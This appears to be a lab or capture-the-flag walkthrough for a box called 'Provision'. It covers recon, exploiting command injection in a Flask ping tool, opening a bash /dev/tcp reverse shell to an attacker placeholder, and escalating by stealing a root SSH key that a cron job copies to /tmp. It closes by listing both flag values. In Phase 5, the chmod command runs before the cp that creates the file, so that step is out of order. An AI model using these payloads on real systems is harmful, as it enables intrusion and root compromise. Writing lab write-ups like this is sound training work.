---
title: Provision
date: 2026-07-29 12:25:00 +0000
categories: [Walkthroughs, WebSecurity]
tags: [pt-garage, flask, command-injection, cron, privesc, web-exploitation, WebSecurity]
---

![Intro Banner](/assets/img/custom_banners/2026-07-29-ptg-provision_banner.png)

**Command Injection (Flask ping utility) → Root Key via Cron**

## Phase 1 — Recon
```bash
nmap -sC -sV <TARGET_IP>
```
Port 8080 hosts a Flask HR diagnostic tool.

## Phase 2 — robots.txt Enumeration
```bash
curl -s http://<TARGET_IP>:8080/static/robots.txt
```
It discloses a hidden `/dev-panel` route pointing back to the diagnostic tool at `/diag`.

## Phase 3 — Command Injection
The `/diag` endpoint pings a host using unsanitised input via `os.popen()`:
```bash
curl -X POST http://<TARGET_IP>:8080/diag -d 'host=127.0.0.1; id'
```
Confirmed injection. Escalate to a reverse shell:
```bash
nc -lvnp 4444
curl -X POST http://<TARGET_IP>:8080/diag \
 --data-urlencode 'host=127.0.0.1; bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"'
```

## Phase 4 — User Flag
```bash
cat /home/www-data/user.txt
```

## Phase 5 — Privilege Escalation (Root Key Backup Cron)
A root cron job runs every minute, copying root's SSH key to a world-readable path:
```bash
cat /etc/crontab | grep key_backup
cat /usr/local/bin/key_backup.sh
```
Wait for the cron to fire, then grab the key:
```bash
cat /tmp/root_backup_key
chmod 600 /tmp/rootkey; cp /tmp/root_backup_key /tmp/rootkey
ssh -i /tmp/rootkey root@<TARGET_IP>
```

## Phase 6 — Root Flag
```bash
cat /root/root.txt
```

![Walkthrough Screenshot](/assets/ptgarage_pages/ptg_lab_walkthroughs/page_8.png)

## Flags
| Type | Flag | Path |
|---|---|---|
| user | 2ad29a9eb5e84f0648dff6ed6727a026 | `/home/www-data/user.txt` |
| root | d4611a01ea853929bef77227a808d888 | `/root/root.txt` |
